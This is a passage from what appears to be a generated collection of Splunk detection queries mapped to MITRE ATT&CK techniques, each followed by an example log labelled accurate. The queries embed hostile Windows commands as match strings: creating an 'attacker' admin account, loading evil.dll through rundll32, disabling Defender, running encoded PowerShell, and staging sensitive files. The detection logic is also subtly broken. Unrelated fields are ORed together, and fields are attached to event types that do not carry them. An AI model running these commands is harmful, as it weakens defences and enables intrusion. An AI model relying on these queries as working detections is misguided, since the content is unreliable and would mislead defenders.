  "User": "Administrator",
  "Source_Network_Address": "192.168.56.103",
  "DestinationPort": "80"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:08:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.124",
  "DestinationPort": "8080"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:10:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.139",
  "DestinationPort": "8443"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:12:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.105",
  "DestinationPort": "3389"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:14:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.139",
  "DestinationPort": "8443"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:16:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.128",
  "DestinationPort": "80"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:18:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.105",
  "DestinationPort": "8080"
}
```

---
